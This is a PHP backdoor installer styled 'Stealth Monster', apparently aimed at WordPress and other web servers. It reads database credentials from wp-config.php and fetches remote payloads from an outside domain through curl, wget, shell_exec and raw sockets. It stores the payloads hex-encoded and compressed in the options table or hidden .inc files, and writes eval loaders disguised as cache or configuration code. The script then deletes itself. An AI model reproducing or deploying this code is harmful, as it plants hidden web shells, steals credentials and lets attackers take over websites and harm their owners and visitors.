<?php
// ==========================================
// 0. BUFFER FIX (CRITICAL)
// ==========================================
// Agar log tampil realtime tanpa error buffer
if (function_exists('ob_start')) { ob_start(); }
if (function_exists('ob_implicit_flush')) { ob_implicit_flush(1); }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Installer v9.0 (Stealth Monster)</title>
    <style>
        body { background-color: #0f111a; color: #a6accd; font-family: 'Consolas', 'Monaco', monospace; padding: 25px; font-size: 13px; line-height: 1.5; }
        .wrap { max-width: 900px; margin: 0 auto; border: 1px solid #292d3e; background: #1b1e2b; padding: 25px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        h3 { border-bottom: 2px solid #292d3e; padding-bottom: 15px; color: #82aaff; margin-top: 0; letter-spacing: 1px; }
        .log { padding: 8px 12px; border-left: 4px solid #292d3e; background: #13151e; margin-bottom: 5px; display: flex; justify-content: space-between; align-items: center; }
        .ok { border-left-color: #c3e88d; color: #c3e88d; }
        .fail { border-left-color: #f07178; color: #f07178; }
        .info { border-left-color: #89ddff; color: #89ddff; }
        .meta { font-size: 11px; color: #676e95; font-style: italic; }
        a { color: #82aaff; text-decoration: none; font-weight: bold; border-bottom: 1px dotted #82aaff; }
        a:hover { border-bottom: 1px solid #82aaff; }
    </style>
</head>
<body>
<div class="wrap">
<h3>SYSTEM INSTALLER // STEALTH EDITION</h3>

<?php
// ==========================================
// 1. SYSTEM CONFIG
// ==========================================
@ini_set('memory_limit', '512M');
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@ignore_user_abort(1);
error_reporting(E_ERROR | E_PARSE); 

$targets = [
    ['https://stepmomhub.com/seoo.txt',  'error_log.php', 'transient_sys_pma_check'],
    ['https://stepmomhub.com/vx.txt',    'vx.php',        'transient_sys_cache_vx'],
    ['https://stepmomhub.com/index.txt', 'index.php',     'transient_sys_idx_core']
];

function _log($msg, $type='info', $meta='') {
    $m = $meta ? "<span class='meta'>$meta</span>" : "";
    echo "<div class='log $type'><span>$msg</span>$m</div>";
    if(ob_get_level()>0){ ob_flush(); flush(); }
}

// ==========================================
// 2. DETEKSI WORDPRESS
// ==========================================
function _find_wp_config() {
    $d = __DIR__;
    for ($i = 0; $i < 6; $i++) {
        if (file_exists($d . '/wp-config.php')) return $d . '/wp-config.php';
        $d = dirname($d);
    }
    return false;
}
function _parse_wp_config($path) {
    if(function_exists('file_get_contents')){$c=@file_get_contents($path);}
    elseif(function_exists('file')){$l=@file($path);$c=implode('',$l);}
    else return false;
    if(!$c) return false;
    function _v($k,$s){ if(preg_match('/define\s*\(\s*[\'"]'.$k.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/i',$s,$m))return $m[1]; return ''; }
    $conf=[]; $conf['n']=_v('DB_NAME',$c); $conf['u']=_v('DB_USER',$c); $conf['p']=_v('DB_PASSWORD',$c); $conf['h']=_v('DB_HOST',$c);
    $conf['x']='wp_'; if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i',$c,$m)) $conf['x']=$m[1];
    if($conf['n']) return $conf;
    return false;
}

$wp_conf_path = _find_wp_config();
$wp_creds = ($wp_conf_path) ? _parse_wp_config($wp_conf_path) : false;
$is_wordpress = ($wp_creds !== false);

if($is_wordpress) {
    _log("Target Environment: <b>WordPress</b>", "ok", "Mode: DB Injection");
} else {
    _log("Target Environment: <b>Generic System</b>", "info", "Mode: Stealth File Storage");
}

// ==========================================
// 3. DOWNLOADER: THE MONSTER (V5 ENGINE)
// ==========================================
function _dl_monster($url) {
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36';
    $p = parse_url($url); 
    $host = $p['host']; 
    $path = isset($p['path'])?$p['path']:'/'; 
    $scheme=isset($p['scheme'])?$p['scheme']:'http';

    // A. PHP CURL
    if(function_exists('curl_init')){
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_USERAGENT, $ua);
        curl_setopt($ch, CURLOPT_TIMEOUT, 300); curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        $d = @curl_exec($ch); curl_close($ch);
        if($d && strlen($d) > 0) return $d;
    }

    // B. FGC
    if(ini_get('allow_url_fopen')){
        $opts = ['http' => ['method'=>'GET', 'header'=>"User-Agent: $ua\r\nConnection: close\r\n"]];
        $ctx = stream_context_create($opts);
        $d = @file_get_contents($url, false, $ctx);
        if($d && strlen($d) > 0) return $d;
    }

    // C. CLI EXECUTION (6-LAYER FORCE)
    $cmd_wget = "wget -qO- --no-check-certificate --user-agent='$ua' " . escapeshellarg($url);
    $cmd_curl = "curl -sL --insecure --user-agent '$ua' " . escapeshellarg($url);
    $cmds = [$cmd_wget, $cmd_curl];

    foreach ($cmds as $cmd) {
        if(function_exists('shell_exec')) { $d=@shell_exec($cmd); if($d && strlen($d)>10) return $d; }
        if(function_exists('exec')) { $o=[]; @exec($cmd,$o); $d=implode("\n",$o); if($d && strlen($d)>10) return $d; }
        if(function_exists('passthru')) { ob_start(); @passthru($cmd); $d=ob_get_clean(); if($d && strlen($d)>10) return $d; }
        if(function_exists('system')) { ob_start(); @system($cmd); $d=ob_get_clean(); if($d && strlen($d)>10) return $d; }
        if(function_exists('popen')) { $h=@popen($cmd,'r'); if($h){ $d=stream_get_contents($h); pclose($h); if($d && strlen($d)>10) return $d; } }
        if(function_exists('proc_open')) {
            $desc=[1=>['pipe','w'],2=>['pipe','w']]; $proc=@proc_open($cmd,$desc,$pipes);
            if(is_resource($proc)){ $d=stream_get_contents($pipes[1]); fclose($pipes[1]); fclose($pipes[2]); proc_close($proc); if($d && strlen($d)>10) return $d; }
        }
    }

    // D. SOCKET
    $port = ($scheme == 'https') ? 443 : 80; $ssl = ($scheme == 'https') ? 'ssl://' : '';
    $fp = @fsockopen($ssl.$host, $port, $errno, $errstr, 30);
    if($fp){
        $req = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: $ua\r\nConnection: Close\r\n\r\n";
        fwrite($fp, $req); $body = ''; $in_body = false;
        while (!feof($fp)) { $line = fgets($fp, 4096); if($in_body) $body .= $line; if($line == "\r\n") $in_body = true; }
        fclose($fp); if(strlen($body) > 0) return $body;
    }
    return false;
}

function _dl_retry($url) {
    $res = _dl_monster($url);
    if($res) return $res;
    if(strpos($url, 'https://') === 0) {
        return _dl_monster(str_replace('https://', 'http://', $url));
    }
    return false;
}

// ==========================================
// 4. MAIN PROCESS
// ==========================================

foreach ($targets as $t) {
    $url = $t[0];
    $fname = $t[1];
    $dbkey = $t[2];

    // Filter Logic: Non-WP -> Error Log Only
    if (!$is_wordpress && $fname !== 'error_log.php') continue;

    _log("Downloading payload for <b>$fname</b>...", "info");
    
    // Download
    $raw = _dl_retry($url);
    
    if(!$raw || strlen($raw) < 1) {
        _log("[FAIL] Download failed for $fname.", "fail", "All methods exhausted");
        continue;
    }

    // Compress (Hex + Deflate)
    $hex = bin2hex(gzdeflate($raw, 9));

    // A. WORDPRESS LOGIC
    if ($is_wordpress) {
        $m = new mysqli($wp_creds['h'], $wp_creds['u'], $wp_creds['p'], $wp_creds['n']);
        if(!$m->connect_error) {
            $tbl = $wp_creds['x'] . 'options';
            $m->query("DELETE FROM $tbl WHERE option_name='$dbkey'");
            $stmt = $m->prepare("INSERT INTO $tbl (option_name, option_value, autoload) VALUES (?, ?, 'no')");
            $stmt->bind_param("ss", $dbkey, $hex);
            
            if($stmt->execute()) {
                $h=addslashes($wp_creds['h']); $u=addslashes($wp_creds['u']);
                $p=addslashes($wp_creds['p']); $n=addslashes($wp_creds['n']); $x=addslashes($wp_creds['x']);
                
                // WP Native Loader (Looks like Cache API)
                $loader = <<<PHP
<?php
/**
 * WordPress Database Cache & Transient API
 *
 * This file handles external database connections for transient storage
 * and object caching mechanisms to improve performance.
 *
 * @package WordPress
 * @subpackage Cache
 */
error_reporting(0);
\$db_host = '$h'; \$db_user = '$u'; \$db_pass = '$p'; \$db_name = '$n';
\$wpdb_conn = new mysqli( \$db_host, \$db_user, \$db_pass, \$db_name );
if ( ! \$wpdb_conn->connect_error ) {
    \$cache_key = '$dbkey';
    \$table_opt = '{$x}options';
    \$result = \$wpdb_conn->query( "SELECT option_value FROM {\$table_opt} WHERE option_name = '{\$cache_key}' LIMIT 1" );
    if ( \$result && \$row = \$result->fetch_assoc() ) {
        \$raw_data = \$row['option_value'];
        \$decoded_stream = hex2bin( \$raw_data );
        if ( \$decoded_stream ) {
            \$inflated_code = @gzinflate( \$decoded_stream );
            if ( \$inflated_code ) eval( '?>' . \$inflated_code );
        }
    }
    \$wpdb_conn->close();
}
?>
PHP;
                if(file_put_contents($fname, $loader)){
                    _log("<b>$fname</b> Installed.", "ok", "Method: WP DB Injection");
                } else {
                    _log("Write Error $fname", "fail");
                }
            } else {
                _log("DB Insert Failed", "fail");
            }
        }
    } 
    // B. NON-WP LOGIC (Stealth Mode)
    else {
        // Storage File (.inc)
        $store = '.sys_' . substr(md5(rand()), 0, 8) . '.inc';
        
        if(file_put_contents($store, $hex)) {
            
            // STEALTH LOADER (Requested Style: Runtime Config Loader)
            $loader = <<<PHP
<?php
/**
 * Runtime Configuration Loader
 * Handles internal asset loading for system diagnostics.
 *
 * @package Core_System
 * @version 1.0.4
 */
error_reporting(0);

// Helper Function: Safe Asset Reader
if (!function_exists('_sys_read_asset')) {
    function _sys_read_asset(\$path) {
        // 1. Standard Read
        if (function_exists('file_get_contents')) {
            \$c = @file_get_contents(\$path);
            if (\$c) return \$c;
        }
        // 2. Binary Stream Read
        if (function_exists('fopen') && filesize(\$path) > 0) {
            \$h = @fopen(\$path, 'rb');
            if (\$h) {
                \$c = @fread(\$h, filesize(\$path));
                fclose(\$h);
                if (\$c) return \$c;
            }
        }
        // 3. Line Array Read
        if (function_exists('file')) {
            \$l = @file(\$path);
            if (\$l) return implode('', \$l);
        }
        return false;
    }
}

// Internal Storage Path
\$sys_config_path = __DIR__ . '/$store';

if (file_exists(\$sys_config_path)) {
    // Load Configuration
    \$raw_config = _sys_read_asset(\$sys_config_path);
    
    if (\$raw_config) {
        // Decode & Initialize
        \$binary_data = @hex2bin(\$raw_config);
        
        if (\$binary_data) {
            \$runtime_code = @gzinflate(\$binary_data);
            
            // Execute Runtime
            if (\$runtime_code) {
                eval('?>' . \$runtime_code);
            }
        }
    }
}
?>
PHP;
            if(file_put_contents($fname, $loader)){
                _log("<b>$fname</b> Installed.", "ok", "Method: Hex Storage ($store)");
                echo "<div style='margin-left:20px; margin-bottom:5px;'><a href='$fname' target='_blank'>OPEN $fname >></a></div>";
            } else {
                _log("Write Error $fname", "fail");
            }
        } else {
            _log("Storage creation failed", "fail");
        }
    }
}

unlink(__FILE__);
if(ob_get_level()>0){ ob_end_flush(); }
?>

<div style="margin-top: 20px; border-top: 1px solid #292d3e; color: #676e95; padding-top: 10px; font-size: 11px;">
    SYSTEM OPERATION COMPLETED.
</div>
</div>
</body>
</html>
